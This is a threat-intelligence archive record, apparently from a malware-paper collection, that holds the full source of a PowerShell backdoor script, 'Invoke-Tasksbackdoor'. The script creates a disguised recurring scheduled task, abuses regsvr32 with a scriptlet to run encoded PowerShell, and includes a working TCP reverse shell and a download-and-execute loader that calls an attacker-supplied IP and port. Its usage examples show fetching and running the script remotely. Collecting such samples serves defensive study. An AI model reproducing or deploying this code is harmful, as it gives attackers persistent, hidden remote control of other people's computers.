{
    "id": "d5641271-be3d-4b34-8f30-b2cf2f75e61a",
    "created_at": "2023-01-12T15:01:59.819111Z",
    "updated_at": "2025-03-27T02:06:08.052515Z",
    "deleted_at": null,
    "sha1_hash": "127a6e82223831beaec0d4bdad85f80e19e02600",
    "title": "2017-08-25 - Schtasks-Backdoor",
    "authors": "",
    "file_creation_date": "2022-05-28T17:56:56Z",
    "file_modification_date": "2022-05-28T17:56:56Z",
    "file_size": 188711,
    "plain_text": "# Schtasks-Backdoor/Schtasks-Backdoor.ps1\n\n**github.com/re4lity/Schtasks-Backdoor/blob/master/Schtasks-Backdoor.ps1**\n\nAV1080p\n\nfunction Invoke-Tasksbackdoor {\n\n<#\n\n.SYNOPSIS\n\nAuthor: xiaocheng 小城\n\nmail:passthru.bug@gmail.com\n\n.DESCRIPTION\n\nthe Script Suitable for windows7 or above\n\nschtasks backdoor\n\nDefault interval of 20 minutes\n\n.EXAMPLE\n\nPS C:\\Users\\test\\Desktop> Invoke-Tasksbackdoor -payload 'whoami >C:\\test.txt'\n\n.EXAMPLE\n\nPS C:\\Users\\test\\Desktop> Invoke-Tasksbackdoor -payload 'whoami >C:\\test.txt' -time 12\n\n.EXAMPLE\n\n\n-----\n\nPS C:\\Users\\test\\Desktop> Invoke-Tasksbackdoor -method msf -ip 127.0.0.1 -port 443 -time 12\n\n.EXAMPLE\n\nPS C:\\Users\\test\\Desktop> Invoke-Tasksbackdoor -method nccat -ip 127.0.0.1 -port 443 -time 12\n\n.EXAMPLE\n\nC:\\Users\\test\\Desktop>powershell.exe -exec bypass -c \"IEX (New-Object Net.WebClient).DownloadString('http://8.8.8.8/InvoketaskBackdoor.ps1');Invoke-Tasksbackdoor -method nccat -ip 8.8.8.8 -port 9999 -time 2\"\n\n.EXAMPLE\n\nC:\\Users\\test\\Desktop>\n\npowershell.exe -exec bypass -c \"IEX (New-Object Net.WebClient).DownloadString('http://8.8.8.8/InvoketaskBackdoor.ps1');Invoke-Tasksbackdoor -method msf -ip 8.8.8.8 -port 8081 -time 2\"\n\n#>\n\n[CmdletBinding()] Param\n\n(\n\n[Parameter(Position = 0, Mandatory = $False)] [String] $Payload,\n\n[Parameter(Position = 1, Mandatory = $False)] [ValidateSet(\"cmd\",\"nccat\",\"msf\")] [String] $method = \"cmd\",\n\n[Parameter(Position=2, Mandatory=$false)] [string] $Ip,\n\n[Parameter(Position=3, Mandatory=$false)] [int] $Port,\n\n[Parameter(Position=4, Mandatory=$false)] [int] $Time\n\n)\n\n$Domain = $env:USERDOMAIN\n\n$Username = $env:USERNAME\n\n$Mia=(get-date).addminutes(2).GetDateTimeFormats('s')\n\n$Miao=(get-date).addminutes(3).GetDateTimeFormats('s')\n\necho $Mia\n\nif($Time -eq \"\") {$Time=20} else{}\n\nfunction Local:Schtasks-exec($cmd, $cmdlines)\n\n{\n\n$WscriptManifest =\n\n@\"\n\n<?xml version=\"1.0\" encoding=\"UTF-16\"?>\n\n<Task version=\"1.2\" xmlns=\"http://schemas.microsoft.com/windows/2004/02/mit/task\">\n\n<RegistrationInfo>\n\n\n-----\n\n<Date>$Miao</Date>\n\n<Author>$Username</Author>\n\n</RegistrationInfo>\n\n<Triggers>\n\n<TimeTrigger>\n\n<Repetition>\n\n<Interval>$(\"PT\"+\"$time\"+\"M\")</Interval>\n\n<StopAtDurationEnd>false</StopAtDurationEnd>\n\n</Repetition>\n\n<StartBoundary>$Mia</StartBoundary>\n\n<Enabled>true</Enabled>\n\n</TimeTrigger>\n\n</Triggers>\n\n<Principals>\n\n<Principal id=\"Author\">\n\n<UserId>$Domain\\$Username</UserId>\n\n<LogonType>InteractiveToken</LogonType>\n\n<RunLevel>LeastPrivilege</RunLevel>\n\n</Principal>\n\n</Principals>\n\n<Settings>\n\n<MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>\n\n<DisallowStartIfOnBatteries>true</DisallowStartIfOnBatteries>\n\n<StopIfGoingOnBatteries>true</StopIfGoingOnBatteries>\n\n<AllowHardTerminate>true</AllowHardTerminate>\n\n<StartWhenAvailable>false</StartWhenAvailable>\n\n<RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable>\n\n<IdleSettings>\n\n<StopOnIdleEnd>true</StopOnIdleEnd>\n\n<RestartOnIdle>false</RestartOnIdle>\n\n</IdleSettings>\n\n<AllowStartOnDemand>true</AllowStartOnDemand>\n\n<Enabled>true</Enabled>\n\n<Hidden>false</Hidden>\n\n<RunOnlyIfIdle>false</RunOnlyIfIdle>\n\n<WakeToRun>false</WakeToRun>\n\n<ExecutionTimeLimit>P3D</ExecutionTimeLimit>\n\n\n-----\n\n<Priority>7</Priority>\n\n</Settings>\n\n<Actions Context=\"Author\">\n\n<Exec>\n\n$Cmd\n\n$Cmdlines\n\n</Exec>\n\n</Actions>\n\n</Task>\n\n\"@\n\n#echo $WscriptManifest\n\n$sManifest = $env:Temp + \"\\wscript2.xml\"\n\n$WscriptManifest | Out-File $sManifest -Encoding Unicode\n\n$temppath=$sManifest -replace '[\\\\]','\\\\'\n\n$CreateWrapperADS = {cmd /C \"schtasks /create /xml $temppath /tn falshupdate22\"}\n\nInvoke-Command -ScriptBlock $CreateWrapperADS | out-null\n\nStart-Sleep -Seconds 5\n\nRemove-Item $sManifest\n\n}\n\nfunction Local:Create-Regscript\n\n{\n\n$utfbytes = [System.Text.Encoding]::Unicode.GetBytes($MSFscript)\n\n$base64string = [System.Convert]::ToBase64String($utfbytes)\n\n$Tempfile =\n\n@\"\n\n<?XML version=\"1.0\"?>\n\n<scriptlet>\n\n<registration\n\nprogid=\"PoC\"\n\nclassid=\"{F0001111-0000-0000-0000-0000FEEDACDC}\" >\n\n<!-- Proof Of Concept - Casey Smith @subTee -->\n\n<!-- License: BSD3-Clause -->\n\n<script language=\"JScript\">\n\n<![CDATA[\n\n\n-----\n\nps = 'powershell.exe -ep bypass -enc ';\n\nc = \"$base64string\";\n\nr = new ActiveXObject(\"WScript.Shell\").Run(ps + c,0,true);\n\n]]>\n\n</script>\n\n</registration>\n\n</scriptlet>\n\n\"@\n\n#echo $Tempfile\n\n$MSFsManifest = $env:Temp + \"\\scripttemp.tks\"\n\nRemove-Item $MSFsManifest\n\n#echo $MSFsManifest\n\n$Tempfile | Out-File $MSFsManifest -Encoding Unicode\n\n$Cmd=\"<Command>regsvr32.exe</Command>\"\n\n$Cmdlines=(\"<Arguments>/u /s /i:\"+\"\"\"$MSFsManifest\"\"\"+\" scrobj.dll</Arguments>\")\n\n#echo $cmd\n\n#echo $cmdlines\n\nSchtasks-exec $cmd $Cmdlines\n\n}\n\nswitch($method)\n\n{\n\n\"msf\"\n\n{\n\n$MSFscript =\n\n@\"\n\n`$n=new-object net.webclient;`$n.proxy=[Net.WebRequest]::GetSystemWebProxy();`$n.Proxy.Credentials=\n\n[Net.CredentialCache]::DefaultCredentials;IEX `$n.downloadstring('http://$(\"$Ip\"+\":\"+\"$Port\")/');\n\n\"@\n\nCreate-Regscript\n\n#Schtasks-exec $cmd $Cmdlines\n\n}\n\n\"cmd\"\n\n{\n\n\n-----\n\n$Cmd=\"<Command>powershell.exe</Command>\"\n\n$Cmdlines=(\"<Arguments>-WindowStyle Hidden -nop -c \"+\"\"\"$Payload\"\"\"+\"</Arguments>\")\n\nSchtasks-exec $cmd $Cmdlines\n\n}\n\n\"nccat\"\n\n{\n\n$MSFscript =\n\n@\"\n\n`$client = New-Object System.Net.Sockets.TCPClient(\"$Ip\",$Port);`$stream = `$client.GetStream();[byte[]]`$bytes = 0..255|%\n{0};`$sendbytes = ([text.encoding]::ASCII).GetBytes(\"Windows PowerShell running as user \" + `$env:username +\n\"`n\");`$stream.Write(`$sendbytes,0,`$sendbytes.Length);while((`$i = `$stream.Read(`$bytes, 0, `$bytes.Length)) -ne 0){;`$data =\n(New-Object -TypeName System.Text.ASCIIEncoding).GetString(`$bytes,0, `$i);`$sendback = (iex `$data 2>&1 | Out-String\n);`$sendback2 = `$sendback + \"PS \" + (pwd).Path + \"> \";`$sendbyte =\n([text.encoding]::ASCII).GetBytes(`$sendback2);`$stream.Write(`$sendbyte,0,`$sendbyte.Length);`$stream.Flush()};`$client.Close()\n\n\"@\n\n#echo $MSFscript.\n\nCreate-Regscript\n\n}\n\n}\n\n}\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2017/2017-08-25 - Schtasks-Backdoor.pdf"
    ],
    "report_names": [
        "2017-08-25 - Schtasks-Backdoor.pdf"
    ],
    "threat_actors": [],
    "ts_created_at": 1673535719,
    "ts_updated_at": 1743041168,
    "ts_creation_date": 1653760616,
    "ts_modification_date": 1653760616,
    "files": {
        "pdf": "https://archive.orkl.eu/127a6e82223831beaec0d4bdad85f80e19e02600.pdf",
        "text": "https://archive.orkl.eu/127a6e82223831beaec0d4bdad85f80e19e02600.txt",
        "img": "https://archive.orkl.eu/127a6e82223831beaec0d4bdad85f80e19e02600.jpg"
    }
}